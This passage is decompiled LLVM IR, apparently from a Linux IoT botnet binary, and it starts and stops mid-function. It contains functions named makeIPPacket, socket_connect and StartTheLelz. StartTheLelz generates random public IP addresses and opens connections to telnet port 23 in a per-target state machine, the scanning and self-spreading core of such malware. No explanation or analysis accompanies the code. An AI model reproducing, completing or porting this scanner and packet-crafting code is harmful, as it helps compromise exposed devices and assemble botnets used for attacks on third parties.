  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba7a = load i32, i32* @ebp, align 4
  store i32 %v0_804ba7a, i32* %stack_var_-4, align 4
  %v4_804ba80 = sext i8 %tmp8 to i32
  %v4_804ba86 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804baa1 = add i32 %v4_804ba86, 1
  %v2_804baa1 = inttoptr i32 %v1_804baa1 to i8*
  store i8 0, i8* %v2_804baa1, align 1
  %v1_804baab = add i32 %tmp5, 20
  %v1_804bab4 = trunc i32 %v1_804baab to i16
  %v3_804bab4 = add i32 %v4_804ba86, 2
  %v4_804bab4 = inttoptr i32 %v3_804bab4 to i16*
  store i16 %v1_804bab4, i16* %v4_804bab4, align 2
  %v2_804bab8 = call i32 @rand_cmwc(i32 %v4_804ba80)
  %v1_804bac3 = trunc i32 %v2_804bab8 to i16
  %v3_804bac3 = add i32 %v4_804ba86, 4
  %v4_804bac3 = inttoptr i32 %v3_804bac3 to i16*
  store i16 %v1_804bac3, i16* %v4_804bac3, align 2
  %v1_804baca = add i32 %v4_804ba86, 6
  %v2_804baca = inttoptr i32 %v1_804baca to i16*
  store i16 0, i16* %v2_804baca, align 2
  %v1_804bad3 = add i32 %v4_804ba86, 8
  %v2_804bad3 = inttoptr i32 %v1_804bad3 to i8*
  store i8 -1, i8* %v2_804bad3, align 1
  %v3_804bade = add i32 %v4_804ba86, 9
  %v4_804bade = inttoptr i32 %v3_804bade to i8*
  store i8 %tmp8, i8* %v4_804bade, align 1
  %v1_804bae4 = add i32 %v4_804ba86, 10
  %v2_804bae4 = inttoptr i32 %v1_804bae4 to i16*
  store i16 0, i16* %v2_804bae4, align 2
  %v2_804baf0 = add i32 %v4_804ba86, 12
  %v3_804baf0 = inttoptr i32 %v2_804baf0 to i32*
  %v2_804baf9 = add i32 %v4_804ba86, 16
  %v3_804baf9 = inttoptr i32 %v2_804baf9 to i32*
  store i32 %tmp, i32* %v3_804baf9, align 4
  %v2_804bafc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bafc, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 2, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804bb04 = add i32 %arg1, -2
  %v9_804bb04 = sub i32 1, %arg1
  %v10_804bb04 = and i32 %v9_804bb04, %arg1
  %v11_804bb04 = icmp slt i32 %v10_804bb04, 0
  %v12_804bb04 = icmp eq i32 %v4_804bb04, 0
  %v13_804bb04 = icmp slt i32 %v4_804bb04, 0
  %v3_804bb08 = icmp eq i1 %v13_804bb04, %v11_804bb04
  %v4_804bb08 = icmp eq i1 %v12_804bb04, false
  %v5_804bb08 = and i1 %v4_804bb08, %v3_804bb08
  br i1 %v5_804bb08, label %dec_label_pc_804bb13, label %dec_label_pc_804bb25

dec_label_pc_804bb13:                             ; preds = %entry
  %v1_804bb19 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804bb25

dec_label_pc_804bb25:                             ; preds = %entry, %dec_label_pc_804bb13
  %storemerge = phi i32 [ 0, %dec_label_pc_804bb13 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804bb04, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804bb25, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bb2a = load i32, i32* @ebp, align 4
  store i32 %v0_804bb2a, i32* %stack_var_-4, align 4
  %v4_804bb2a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804bb2a, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804bb44 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804bb4c = icmp eq i32 %v1_804bb44, 0
  %v1_804bb50 = icmp eq i1 %v4_804bb4c, false
  br i1 %v1_804bb50, label %dec_label_pc_804bb5e, label %dec_label_pc_804bc23

dec_label_pc_804bb5e:                             ; preds = %entry
  %v1_804bb61 = add i32 %v1_804bb44, 12
  %v2_804bb61 = inttoptr i32 %v1_804bb61 to i32*
  %v3_804bb61 = load i32, i32* %v2_804bb61, align 4
  %v1_804bb69 = add i32 %v1_804bb44, 16
  %v2_804bb69 = inttoptr i32 %v1_804bb69 to i32*
  %v3_804bb69 = load i32, i32* %v2_804bb69, align 4
  %v1_804bb6c = inttoptr i32 %v3_804bb69 to i32*
  %v2_804bb6c = load i32, i32* %v1_804bb6c, align 4
  %v15_804bb75 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804bb7f = call i32 @bcopy(i32 %v2_804bb6c, i32 %v15_804bb75, i32 %v3_804bb61)
  %v2_804bb8b = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804bbb4 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804bbbc = ptrtoint i32* %stack_var_-32 to i32
  %v5_804bbe1 = call i32 @__GI_setsockopt(i32 %v3_804bbb4, i32 6, i32 1, i32 %v2_804bbbc, i32 4)
  %v13_804bbe6 = icmp eq i32 %v3_804bbb4, -1
  %v1_804bbea = icmp eq i1 %v13_804bbe6, false
  br i1 %v1_804bbea, label %dec_label_pc_804bbf5, label %dec_label_pc_804bc23

dec_label_pc_804bbf5:                             ; preds = %dec_label_pc_804bb5e
  %v2_804bb72 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804bc0a = call i32 @__libc_connect(i32 %v3_804bbb4, i32 %v2_804bb72, i32 16)
  %v10_804bc0f = icmp eq i32 %v3_804bc0a, -1
  %v1_804bc12 = icmp eq i1 %v10_804bc0f, false
  br i1 %v1_804bc12, label %dec_label_pc_804bc1d, label %dec_label_pc_804bc23

dec_label_pc_804bc1d:                             ; preds = %dec_label_pc_804bbf5
  br label %dec_label_pc_804bc23

dec_label_pc_804bc23:                             ; preds = %dec_label_pc_804bbf5, %dec_label_pc_804bb5e, %entry, %dec_label_pc_804bc1d
  %stack_var_-44.0 = phi i32 [ %v3_804bbb4, %dec_label_pc_804bc1d ], [ 0, %entry ], [ 0, %dec_label_pc_804bb5e ], [ 0, %dec_label_pc_804bbf5 ]
  %v2_804bc26 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc26, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_804bbb4, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804bc23, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804bc41 = call i32 @__GI_time(i32* null)
  store i32 %v2_804bc41, i32* %eax.global-to-local, align 4
  store i32 %v2_804bc41, i32* @ebx, align 4
  %v1_804bc48 = call i32 @rand_cmwc(i32 0)
  %v1_804bc4d = load i32, i32* @ebx, align 4
  %v2_804bc4d = xor i32 %v1_804bc4d, %v1_804bc48
  store i32 %v2_804bc4d, i32* @eax, align 4
  %v1_804bc52 = call i32 @srand(i32 %v2_804bc4d)
  store i32 %v1_804bc52, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v2_804bc67 = call i32 @htons(i16 23)
  %v2_804bc76 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804bc7c = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804bc7c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804bc93 = call i32 @malloc(i32 1025)
  store i32 %v1_804bc93, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804bcb4 = inttoptr i32 %v1_804bc93 to i8*
  %v4_804bcb4 = call i32 @__GI_memset(i8* %v3_804bcb4, i32 0, i32 1025)
  %v2_804bcca = mul i32 %arg2, 28
  %v1_804bccf = add i32 %v2_804bcca, 30
  %v2_804bcd2 = and i32 %v1_804bccf, -16
  %v0_804bcd8 = load i32, i32* @esp, align 4
  %v2_804bcd8 = sub i32 %v0_804bcd8, %v2_804bcd2
  %v1_804bcea = add i32 %v2_804bcd8, 35
  %v2_804bced = and i32 %v1_804bcea, -16
  %v2_804bd0a = mul i32 %arg2, 5
  store i32 %v2_804bd0a, i32* %edx.global-to-local, align 4
  %v1_804bd10 = inttoptr i32 %v2_804bced to i8*
  store i32 %v2_804bced, i32* @edi, align 4
  %v1_804bd15 = and i32 %v1_804bcea, -256
  store i32 %v1_804bd15, i32* %eax.global-to-local, align 4
  %v5_804bd17 = call i8* @_memset(i8* %v1_804bd10, i32 %v1_804bd15, i32 %v2_804bd0a)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804bda458 = icmp sgt i32 %arg2, 0
  br i1 %v5_804bda458, label %dec_label_pc_804bd22.lr.ph, label %dec_label_pc_804bdb1

dec_label_pc_804bd22.lr.ph:                       ; preds = %entry
  %v2_804bd76 = or i32 %v2_804bced, 9
  br label %dec_label_pc_804bd22

dec_label_pc_804bd22:                             ; preds = %dec_label_pc_804bd22, %dec_label_pc_804bd22.lr.ph
  %storemerge259 = phi i32 [ 0, %dec_label_pc_804bd22.lr.ph ], [ %v4_804bd9b, %dec_label_pc_804bd22 ]
  %v2_804bd36 = mul i32 %storemerge259, 28
  %v2_804bd38 = add i32 %v2_804bd36, %v2_804bced
  store i32 %v2_804bd38, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804bd40 = inttoptr i32 %v2_804bd38 to i32*
  store i32 0, i32* %v2_804bd40, align 4
  %v0_804bd42 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd42 = add i32 %v0_804bd42, 4
  store i32 %v1_804bd42, i32* %eax.global-to-local, align 4
  %v0_804bd45 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd45 = inttoptr i32 %v1_804bd42 to i32*
  store i32 %v0_804bd45, i32* %v2_804bd45, align 4
  %v0_804bd47 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd47 = add i32 %v0_804bd47, 4
  store i32 %v1_804bd47, i32* %eax.global-to-local, align 4
  %v0_804bd4a = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd4a = inttoptr i32 %v1_804bd47 to i32*
  store i32 %v0_804bd4a, i32* %v2_804bd4a, align 4
  %v0_804bd4c = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd4c = add i32 %v0_804bd4c, 4
  store i32 %v1_804bd4c, i32* %eax.global-to-local, align 4
  %v0_804bd4f = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd4f = inttoptr i32 %v1_804bd4c to i32*
  store i32 %v0_804bd4f, i32* %v2_804bd4f, align 4
  %v0_804bd51 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd51 = add i32 %v0_804bd51, 4
  store i32 %v1_804bd51, i32* %eax.global-to-local, align 4
  %v0_804bd54 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd54 = inttoptr i32 %v1_804bd51 to i32*
  store i32 %v0_804bd54, i32* %v2_804bd54, align 4
  %v0_804bd56 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd56 = add i32 %v0_804bd56, 4
  store i32 %v1_804bd56, i32* %eax.global-to-local, align 4
  %v0_804bd59 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd59 = inttoptr i32 %v1_804bd56 to i32*
  store i32 %v0_804bd59, i32* %v2_804bd59, align 4
  %v0_804bd5b = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd5b = add i32 %v0_804bd5b, 4
  %v0_804bd5e = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd5e = inttoptr i32 %v1_804bd5b to i32*
  store i32 %v0_804bd5e, i32* %v2_804bd5e, align 4
  %v3_804bd76 = add i32 %v2_804bd76, %v2_804bd36
  %v4_804bd76 = inttoptr i32 %v3_804bd76 to i8*
  store i8 1, i8* %v4_804bd76, align 1
  %v1_804bd93 = add i32 %v2_804bd38, 24
  store i32 %v1_804bd93, i32* %edx.global-to-local, align 4
  %v2_804bd99 = inttoptr i32 %v1_804bd93 to i32*
  store i32 %v1_804bc93, i32* %v2_804bd99, align 4
  %v4_804bd9b = add nuw nsw i32 %storemerge259, 1
  store i32 %v4_804bd9b, i32* %eax.global-to-local, align 4
  %exitcond60 = icmp eq i32 %v4_804bd9b, %arg2
  br i1 %exitcond60, label %dec_label_pc_804bdb1, label %dec_label_pc_804bd22

dec_label_pc_804bdb1:                             ; preds = %entry, %dec_label_pc_804bd22, %dec_label_pc_804bdb1
  %stack_var_-48.0 = phi i32 [ %v4_804bdb1, %dec_label_pc_804bdb1 ], [ 0, %dec_label_pc_804bd22 ], [ 0, %entry ]
  %v4_804bdb1 = add i32 %stack_var_-48.0, 1
  store i32 %v4_804bdb1, i32* %eax.global-to-local, align 4
  %v1_804bdb7 = mul i32 %v4_804bdb1, 4
  %v2_804bdb7 = add i32 %v1_804bdb7, ptrtoint ([10 x i8*]* @global_var_80621c0.168 to i32)
  %v3_804bdb7 = inttoptr i32 %v2_804bdb7 to i32*
  %v4_804bdb7 = load i32, i32* %v3_804bdb7, align 4
  store i32 %v4_804bdb7, i32* %eax.global-to-local, align 4
  %v1_804bdbe = icmp eq i32 %v4_804bdb7, 0
  %v1_804bdc0 = icmp eq i1 %v1_804bdbe, false
  br i1 %v1_804bdc0, label %dec_label_pc_804bdb1, label %dec_label_pc_804bdc2.preheader

dec_label_pc_804bdc2.preheader:                   ; preds = %dec_label_pc_804bdb1
  %v2_804c212 = ptrtoint i32* %stack_var_-316 to i32
  %tmp37 = bitcast i32* %stack_var_-316 to i8*
  %v2_804c292 = ptrtoint i32* %stack_var_-324 to i32
  %v2_804c2f8 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804c302 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804be32 = or i32 %v2_804bced, 8
  %v2_804be72 = or i32 %v2_804bced, 9
  %v2_804bf63 = or i32 %v2_804bced, 11
  %v2_804bfaa = or i32 %v2_804bced, 10
  %v2_804ca1b = add i32 %v2_804bced, 16
  br label %dec_label_pc_804bdc2

dec_label_pc_804bdc2:                             ; preds = %dec_label_pc_804bdc2, %dec_label_pc_804cd9e, %dec_label_pc_804bdc2.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804bdc2.preheader ], [ %stack_var_-624.0, %dec_label_pc_804bdc2 ], [ %stack_var_-624.1, %dec_label_pc_804cd9e ]
  %stack_var_-628.0 = phi i32 [ %tmp3, %dec_label_pc_804bdc2.preheader ], [ %stack_var_-628.0, %dec_label_pc_804bdc2 ], [ %stack_var_-628.1, %dec_label_pc_804cd9e ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804bda458, label %dec_label_pc_804bdce, label %dec_label_pc_804bdc2

dec_label_pc_804bdce:                             ; preds = %dec_label_pc_804bdc2, %dec_label_pc_804cd9e
  %storemerge49 = phi i32 [ %v4_804cd9e, %dec_label_pc_804cd9e ], [ 0, %dec_label_pc_804bdc2 ]
  %stack_var_-628.248 = phi i32 [ %stack_var_-628.1, %dec_label_pc_804cd9e ], [ %stack_var_-628.0, %dec_label_pc_804bdc2 ]
  %stack_var_-624.247 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804cd9e ], [ %stack_var_-624.0, %dec_label_pc_804bdc2 ]
  %v1_804bdd4 = mul i32 %storemerge49, 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  %v2_804bde2 = mul i32 %storemerge49, 28
  %v2_804bde4 = add i32 %v2_804bde2, %v2_804bced
  %v1_804bde6 = add i32 %v2_804bde4, 16
  store i32 %v1_804bde6, i32* %eax.global-to-local, align 4
  %v1_804bde9 = inttoptr i32 %v1_804bde6 to i32*
  %v2_804bde9 = load i32, i32* %v1_804bde9, align 4
  store i32 %v2_804bde9, i32* %eax.global-to-local, align 4
  %v1_804bdeb = icmp eq i32 %v2_804bde9, 0
  %v1_804bded = icmp eq i1 %v1_804bdeb, false
  br i1 %v1_804bded, label %dec_label_pc_804be1c, label %dec_label_pc_804bdef

dec_label_pc_804bdef:                             ; preds = %dec_label_pc_804bdce
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804bdf2 = load i32, i32* @esp, align 4
  %v1_804bdf2 = inttoptr i32 %v0_804bdf2 to i32*
  store i32 0, i32* %v1_804bdf2, align 4
  %v1_804bdf9 = inttoptr i32 %storemerge49 to i32*
  %v2_804bdf9 = call i32 @__GI_time(i32* %v1_804bdf9)
  store i32 %v2_804bdf9, i32* @esi, align 4
  %v0_804be03 = load i32, i32* @ebx, align 4
  %v1_804be05 = mul i32 %v0_804be03, 4
  store i32 %v1_804be05, i32* %edx.global-to-local, align 4
  %v2_804be13 = mul i32 %v0_804be03, 28
  %v2_804be15 = add i32 %v2_804be13, %v2_804bced
  %v1_804be17 = add i32 %v2_804be15, 16
  store i32 %v1_804be17, i32* %eax.global-to-local, align 4
  %v2_804be1a = inttoptr i32 %v1_804be17 to i32*
  store i32 %v2_804bdf9, i32* %v2_804be1a, align 4
  br label %dec_label_pc_804be1c

dec_label_pc_804be1c:                             ; preds = %dec_label_pc_804bdce, %dec_label_pc_804bdef
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804be32 = add i32 %v2_804be32, %v2_804bde2
  %v4_804be32 = inttoptr i32 %v3_804be32 to i8*
  %v5_804be32 = load i8, i8* %v4_804be32, align 4
  %v6_804be32 = zext i8 %v5_804be32 to i32
  store i32 %v6_804be32, i32* %eax.global-to-local, align 4
  store i32 %v6_804be32, i32* @edi, align 4
  %v1_804be53 = mul nuw nsw i32 %v6_804be32, 4
  %v2_804be53 = add nuw nsw i32 %v1_804be53, 134577964
  %v3_804be53 = inttoptr i32 %v2_804be53 to i32*
  %v4_804be53 = load i32, i32* %v3_804be53, align 4
  store i32 %v4_804be53, i32* %eax.global-to-local, align 4
  switch i8 %v5_804be32, label %dec_label_pc_804cd9e [
    i8 0, label %dec_label_pc_804be5c
    i8 1, label %dec_label_pc_804c208
    i8 2, label %dec_label_pc_804c46e
    i8 3, label %dec_label_pc_804c5ae
    i8 4, label %dec_label_pc_804c701
    i8 5, label %dec_label_pc_804c841
    i8 6, label %dec_label_pc_804c994
    i8 7, label %dec_label_pc_804cc2e
  ]

dec_label_pc_804be5c:                             ; preds = %dec_label_pc_804be1c
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804be72 = add i32 %v2_804be72, %v2_804bde2
  %v4_804be72 = inttoptr i32 %v3_804be72 to i8*
  %v5_804be72 = load i8, i8* %v4_804be72, align 1
  %v10_804be77 = icmp eq i8 %v5_804be72, 1
  %v1_804be79 = icmp eq i1 %v10_804be77, false
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  br i1 %v1_804be79, label %dec_label_pc_804bf28, label %dec_label_pc_804be7f

dec_label_pc_804be7f:                             ; preds = %dec_label_pc_804be5c
  %v1_804be97 = add i32 %v2_804bde4, 24
  store i32 %v1_804be97, i32* %eax.global-to-local, align 4
  %v1_804be9a = inttoptr i32 %v1_804be97 to i32*
  %v2_804be9a = load i32, i32* %v1_804be9a, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804bebd = inttoptr i32 %v2_804bde4 to i32*
  store i32 0, i32* %v2_804bebd, align 4
  %v0_804bebf = load i32, i32* %eax.global-to-local, align 4
  %v1_804bebf = add i32 %v0_804bebf, 4
  store i32 %v1_804bebf, i32* %eax.global-to-local, align 4
  %v0_804bec2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bec2 = inttoptr i32 %v1_804bebf to i32*
  store i32 %v0_804bec2, i32* %v2_804bec2, align 4
  %v0_804bec4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bec4 = add i32 %v0_804bec4, 4
  store i32 %v1_804bec4, i32* %eax.global-to-local, align 4
  %v0_804bec7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bec7 = inttoptr i32 %v1_804bec4 to i32*
  store i32 %v0_804bec7, i32* %v2_804bec7, align 4
  %v0_804bec9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bec9 = add i32 %v0_804bec9, 4
  store i32 %v1_804bec9, i32* %eax.global-to-local, align 4
  %v0_804becc = load i32, i32* %edx.global-to-local, align 4
  %v2_804becc = inttoptr i32 %v1_804bec9 to i32*
  store i32 %v0_804becc, i32* %v2_804becc, align 4
  %v0_804bece = load i32, i32* %eax.global-to-local, align 4
  %v1_804bece = add i32 %v0_804bece, 4
  store i32 %v1_804bece, i32* %eax.global-to-local, align 4
  %v0_804bed1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bed1 = inttoptr i32 %v1_804bece to i32*
  store i32 %v0_804bed1, i32* %v2_804bed1, align 4
  %v0_804bed3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bed3 = add i32 %v0_804bed3, 4
  store i32 %v1_804bed3, i32* %eax.global-to-local, align 4
  %v0_804bed6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bed6 = inttoptr i32 %v1_804bed3 to i32*
  store i32 %v0_804bed6, i32* %v2_804bed6, align 4
  %v0_804bed8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bed8 = add i32 %v0_804bed8, 4
  %v0_804bedb = load i32, i32* %edx.global-to-local, align 4
  %v2_804bedb = inttoptr i32 %v1_804bed8 to i32*
  store i32 %v0_804bedb, i32* %v2_804bedb, align 4
  store i32 %v1_804be97, i32* %edx.global-to-local, align 4
  store i32 %v2_804be9a, i32* @eax, align 4
  store i32 %v2_804be9a, i32* %v1_804be9a, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v1_804bf00 = call i32 @GetRandomPublicIP(i32 %v6_804be32)
  %v0_804bf0a = load i32, i32* @ebx, align 4
  %v1_804bf0c = mul i32 %v0_804bf0a, 4
  store i32 %v1_804bf0c, i32* %edx.global-to-local, align 4
  %v2_804bf1a = mul i32 %v0_804bf0a, 28
  %v2_804bf1c = add i32 %v2_804bf1a, %v2_804bced
  %v1_804bf1e = add i32 %v2_804bf1c, 4
  store i32 %v1_804bf1e, i32* %eax.global-to-local, align 4
  %v2_804bf21 = inttoptr i32 %v1_804bf1e to i32*
  store i32 %v1_804bf00, i32* %v2_804bf21, align 4
  br label %dec_label_pc_804c057

dec_label_pc_804bf28:                             ; preds = %dec_label_pc_804be5c
  %v5_804bf3e = load i8, i8* %v4_804be72, align 1
  %v6_804bf3e = zext i8 %v5_804bf3e to i32
  store i32 %v6_804bf3e, i32* %eax.global-to-local, align 4
  %v4_804bf43 = icmp eq i8 %v5_804bf3e, 0
  %v1_804bf45 = icmp eq i1 %v4_804bf43, false
  br i1 %v1_804bf45, label %dec_label_pc_804c057, label %dec_label_pc_804bf4b

dec_label_pc_804bf4b:                             ; preds = %dec_label_pc_804bf28
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804bf63 = add i32 %v2_804bf63, %v2_804bde2
  %v4_804bf63 = inttoptr i32 %v3_804bf63 to i8*
  %v5_804bf63 = load i8, i8* %v4_804bf63, align 1
  %v2_804bf6a = add i8 %v5_804bf63, 1
  store i8 %v2_804bf6a, i8* %v4_804bf63, align 1
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804bfaa = add i32 %v2_804bfaa, %v2_804bde2
  %v4_804bfaa = inttoptr i32 %v3_804bfaa to i8*
  %v5_804bfaa = load i8, i8* %v4_804bfaa, align 2
  %v2_804bfb1 = add i8 %v5_804bfaa, 1
  store i8 %v2_804bfb1, i8* %v4_804bfaa, align 2
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v5_804bfef = load i8, i8* %v4_804bf63, align 1
  %v10_804bff4 = icmp eq i8 %v5_804bfef, 3
  %v1_804bff6 = icmp eq i1 %v10_804bff4, false
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  br i1 %v1_804bff6, label %dec_label_pc_804c018, label %dec_label_pc_804bff8

dec_label_pc_804bff8:                             ; preds = %dec_label_pc_804bf4b
  store i8 1, i8* %v4_804be72, align 1
  br label %dec_label_pc_804cd9e

dec_label_pc_804c018:                             ; preds = %dec_label_pc_804bf4b
  %v5_804c02e = load i8, i8* %v4_804bfaa, align 2
  %v6_804c02e = zext i8 %v5_804c02e to i32
  store i32 %v6_804c02e, i32* %eax.global-to-local, align 4
  %v10_804c033 = icmp eq i8 %v5_804c02e, 3
  %v1_804c035 = icmp eq i1 %v10_804c033, false
  br i1 %v1_804c035, label %dec_label_pc_804c057, label %dec_label_pc_804c037

dec_label_pc_804c037:                             ; preds = %dec_label_pc_804c018
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804be72, align 1
  br label %dec_label_pc_804cd9e

dec_label_pc_804c057:                             ; preds = %dec_label_pc_804c018, %dec_label_pc_804bf28, %dec_label_pc_804be7f
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804c060 = load i32, i32* @esp, align 4
  %v1_804c060 = inttoptr i32 %v0_804c060 to i32*
  store i32 23, i32* %v1_804c060, align 4
  %v0_804c067 = load i32, i32* %stack_var_-604, align 4
  %v1_804c067 = trunc i32 %v0_804c067 to i16
  %v2_804c067 = call i32 @htons(i16 %v1_804c067)
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  %v1_804c0a4 = add i32 %v2_804bde4, 4
  store i32 %v1_804c0a4, i32* %eax.global-to-local, align 4
  %v1_804c0a7 = inttoptr i32 %v1_804c0a4 to i32*
  %v2_804c0a7 = load i32, i32* %v1_804c0a7, align 4
  store i32 %v2_804c0a7, i32* %eax.global-to-local, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804c0b2 = load i32, i32* @esp, align 4
  %v1_804c0b2 = add i32 %v0_804c0b2, 8
  %v2_804c0b2 = inttoptr i32 %v1_804c0b2 to i32*
  store i32 0, i32* %v2_804c0b2, align 4
  %v0_804c0ba = load i32, i32* @esp, align 4
  %v1_804c0ba = add i32 %v0_804c0ba, 4
  %v2_804c0ba = inttoptr i32 %v1_804c0ba to i32*
  store i32 1, i32* %v2_804c0ba, align 4
  %v0_804c0c2 = load i32, i32* @esp, align 4
  %v1_804c0c2 = inttoptr i32 %v0_804c0c2 to i32*
  store i32 2, i32* %v1_804c0c2, align 4
  %v2_804c0c9 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v2_804c067, 65536
  %v3_804c0c9 = sdiv i32 %sext, 65536
  %v4_804c0c9 = call i32 @socket(i32 %v3_804c0c9, i32 %v2_804c0a7, i32 %v2_804c0c9)
  store i32 %v4_804c0c9, i32* @esi, align 4
  %v0_804c0d3 = load i32, i32* @ebx, align 4
  %v2_804c0e3 = mul i32 %v0_804c0d3, 28
  %v3_804c0e5 = add i32 %v2_804c0e3, %v2_804bced
  %v4_804c0e5 = inttoptr i32 %v3_804c0e5 to i32*
  store i32 %v4_804c0c9, i32* %v4_804c0e5, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c0fe = inttoptr i32 %v2_804bde4 to i32*
  %v4_804c0fe = load i32, i32* %v3_804c0fe, align 4
  store i32 %v4_804c0fe, i32* %eax.global-to-local, align 4
  %v10_804c101 = icmp eq i32 %v4_804c0fe, -1
  br i1 %v10_804c101, label %dec_label_pc_804cd9e, label %dec_label_pc_804c10a

dec_label_pc_804c10a:                             ; preds = %dec_label_pc_804c057
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c120 = load i32, i32* %v3_804c0fe, align 4
  store i32 %v4_804c120, i32* %eax.global-to-local, align 4
  %v0_804c123 = load i32, i32* @esp, align 4
  %v1_804c123 = add i32 %v0_804c123, 8
